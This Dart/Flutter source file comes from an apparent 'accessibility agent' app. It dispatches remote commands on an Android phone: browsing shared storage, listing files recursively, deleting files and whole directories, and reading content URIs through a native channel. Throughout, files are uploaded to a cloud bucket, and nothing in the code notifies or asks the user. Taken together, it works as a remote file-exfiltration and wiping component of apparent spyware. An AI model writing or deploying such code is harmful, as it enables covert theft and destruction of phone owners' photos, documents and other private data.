// lib/platform/command_dispatcher.dart
import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:http_parser/http_parser.dart';

import '../core/command_parser.dart';
import '../core/device_agent.dart';

class CommandDispatcher {
  CommandDispatcher._();
  static final CommandDispatcher instance = CommandDispatcher._();

  static const MethodChannel _channel =
      MethodChannel('cyber_accessibility_agent/commands');

  final CommandExecutor _executor = CommandExecutor.instance;

  Future<Map<String, dynamic>> dispatch(Command cmd) async {
    final path = cmd.payload['path'];
    if (path is String && path.startsWith('content://') && Platform.isAndroid) {
      return _handleContentUriUpload(cmd, path);
    }
    return _executor.execute(cmd);
  }

  Future<Map<String, dynamic>> executeCommand(
    Command cmd, {
    Duration timeout = const Duration(seconds: 30),
    int maxRetries = 2,
  }) async {
    int attempt = 0;
    const baseDelayMs = 300;

    while (true) {
      attempt++;
      try {
        final res = await dispatch(cmd).timeout(timeout);
        return Map<String, dynamic>.from(res);
      } catch (e, st) {
        if (attempt > maxRetries) return {'success': false, 'error': 'dispatcher_failed', 'detail': e.toString(), 'attempts': attempt};
        final delayMs = baseDelayMs * (1 << (attempt - 1));
        await Future.delayed(Duration(milliseconds: delayMs > 5000 ? 5000 : delayMs));
      }
    }
  }

  Future<Map<String, dynamic>> _handleContentUriUpload(Command cmd, String uri) async {
    try {
      final raw = await _channel.invokeMethod<dynamic>('readContentUri', {'uri': uri});
      if (raw == null || raw is! Map) return {'success': false, 'error': 'native_read_failed', 'detail': 'Invalid response'};
      final result = Map<String, dynamic>.from(raw);
      if (result['success'] != true) return {'success': false, 'error': 'content_uri_read_failed', 'detail': result['error'] ?? result['detail']};

      final String? b64 = (result['b64'] ?? result['file_b64'] ?? result['fileB64'])?.toString();
      final meta = result['meta'] ?? result['metadata'];
      final filename = (result['filename'] ?? (meta is Map ? meta['display_name'] ?? meta['name'] : null))?.toString() ?? 'content_${DateTime.now().millisecondsSinceEpoch}';
      final contentType = (result['content_type'] ?? (meta is Map ? meta['mime'] : null) ?? 'application/octet-stream').toString();

      if (b64 == null || b64.isEmpty) return {'success': false, 'error': 'no_file_bytes'};

      List<int> bytes;
      try { bytes = base64Decode(b64); } catch (e) { return {'success': false, 'error': 'base64_decode_failed', 'detail': e.toString()}; }

      final bucket = (cmd.payload['bucket'] as String?) ?? 'device-uploads';
      final dest = (cmd.payload['dest'] as String?) ?? filename;

      try {
        final uploadRes = await DeviceAgent.instance.uploadFile(path: filename, bytes: bytes, contentType: contentType, bucket: bucket, dest: dest);
        if (uploadRes['success'] == true) return Map<String, dynamic>.from(uploadRes);
        return {'success': false, 'error': uploadRes['error'] ?? 'upload_failed', 'detail': uploadRes};
      } catch (e) { return {'success': false, 'error': 'upload_exception', 'detail': e.toString()}; }
    } catch (e) { return {'success': false, 'error': 'content_uri_exception', 'detail': e.toString()}; }
  }
}

class CommandExecutor {
  CommandExecutor._();
  static final CommandExecutor instance = CommandExecutor._();

  static const _root = '/storage/emulated/0';
  static const _defaultBucket = 'device-uploads';

  String _cwd = _root;
  String get cwd => _cwd;

  String _normalize(String path) => path.endsWith('/') && path.length > 1 ? path.substring(0, path.length - 1) : path;
  String _resolvePath(String input) {
    if (input.isEmpty) return _cwd;
    if (input.startsWith('/')) return _normalize(input);
    if (input == '..') {
      if (_cwd == _root) return _root;
      final i = _cwd.lastIndexOf('/');
      return i > _root.length ? _cwd.substring(0, i) : _root;
    }
    return _normalize('$_cwd/$input');
  }

  bool _isInsideRoot(String path) => path == _root || path.startsWith('$_root/');

  Future<Map<String, dynamic>> execute(Command cmd) async {
    try {
      switch (cmd.action) {
        case CommandAction.changeDir: return _wrapSync(() => _cd(cmd.payload['path'] as String?));
        case CommandAction.listFiles: return _wrapSync(() => _ls(cmd.payload['path'] as String?, recursive: cmd.payload['recursive'] == true, limit: cmd.payload['limit'] is int ? cmd.payload['limit'] : 100));
        case CommandAction.deleteFile: return _wrapSync(() => _rm(cmd.payload['path'] as String?));
        case CommandAction.uploadFile: return await _uploadFileSystem(cmd.payload['path'] as String?, deviceId: cmd.deviceId, bucket: cmd.payload['bucket'] as String?, dest: cmd.payload['dest'] as String?);
        case CommandAction.deviceInfo: return _ok({'cwd': _cwd, 'storage_root': _root});
        case CommandAction.ping: return _ok({'ts': DateTime.now().toUtc().toIso8601String()});
        default: return _err('unsupported_action', 'Action not supported');
      }
    } catch (e, st) { return _err('exception', '$e\n$st'); }
  }

  Map<String, dynamic> _cd(String? path) {
    if (path == null || path.isEmpty) return _err('cd_requires_path', 'cd requires path');
    final newPath = _resolvePath(path);
    if (!_isInsideRoot(newPath)) return _err('access_denied', 'path outside storage root');
    final dir = Directory(newPath);
    if (!dir.existsSync()) return _err('directory_not_found', newPath);
    _cwd = newPath;
    return _ok({'cwd': _cwd});
  }

  Map<String, dynamic> _ls(String? path, {bool recursive = false, int limit = 100}) {
    final target = (path == null || path.isEmpty) ? _cwd : _resolvePath(path);
    if (!_isInsideRoot(target)) return _err('access_denied', 'path outside storage root');
    final dir = Directory(target);
    if (!dir.existsSync()) return _err('directory_not_found', target);
    final entries = <Map<String, dynamic>>[];

    void walk(Directory d) {
      for (final e in d.listSync(followLinks: false)) {
        if (entries.length >= limit) return;
        try {
          final stat = e.statSync();
          entries.add({
            'name': e.path.split('/').last,
            'path': e.path,
            'type': stat.type == FileSystemEntityType.directory ? 'dir' : 'file',
            'size': stat.size,
            'modified': stat.modified.toUtc().toIso8601String(),
          });
          if (recursive && stat.type == FileSystemEntityType.directory) walk(Directory(e.path));
        } catch (_) {}
      }
    }

    walk(dir);
    return _ok({'cwd': _cwd, 'count': entries.length, 'entries': entries});
  }

  Map<String, dynamic> _rm(String? path) {
    if (path == null || path.isEmpty) return _err('rm_requires_file', 'rm requires path');
    final target = _resolvePath(path);
    if (!_isInsideRoot(target)) return _err('access_denied', 'path outside storage root');

    try {
      final f = File(target);
      final d = Directory(target);
      if (f.existsSync()) { f.deleteSync(); return _ok({'deleted': target, 'type': 'file'}); }
      if (d.existsSync()) { d.deleteSync(recursive: true); return _ok({'deleted': target, 'type': 'directory'}); }
      return _err('not_found', target);
    } catch (e, st) { return _err('delete_failed', '$e\n$st'); }
  }

  Future<Map<String, dynamic>> _uploadFileSystem(String? path, {String? deviceId, String? bucket, String? dest}) async {
    if (path == null || path.isEmpty) return _err('upload_requires_file', 'upload requires path');
    final target = _resolvePath(path);
    if (!_isInsideRoot(target)) return _err('access_denied', 'path outside storage root');

    final file = File(target);
    if (!file.existsSync()) return _err('file_not_found', target);

    try {
      final bytes = await file.readAsBytes();
      final filename = dest?.isNotEmpty == true ? dest! : file.path.split('/').last;
      final contentType = _guessContentType(file.path) ?? 'application/octet-stream';
      final res = await DeviceAgent.instance.uploadFile(path: filename, bytes: bytes, contentType: contentType, bucket: bucket ?? _defaultBucket, dest: filename);
      if (res['success'] == true) return _ok({'file': file.path, 'upload': res});
      return _err('upload_failed', res.toString());
    } catch (e, st) { return _err('upload_exception', '$e\n$st'); }
  }

  String? _guessContentType(String path) {
    final ext = path.split('.').last.toLowerCase();
    switch (ext) { case 'jpg': case 'jpeg': return 'image/jpeg'; case 'png': return 'image/png'; case 'mp4': return 'video/mp4'; case 'pdf': return 'application/pdf'; }
    return null;
  }

  Map<String, dynamic> _ok([Map<String, dynamic>? data]) => {'success': true, if (data != null) 'result': data};
  Map<String, dynamic> _err(String code, [String? detail]) => {'success': false, 'error': code, if (detail != null) 'detail': detail};
  Map<String, dynamic> _wrapSync(Map<String, dynamic> Function() fn) { try { return fn(); } catch (e, st) { return _err('exception', '$e\n$st'); } }
}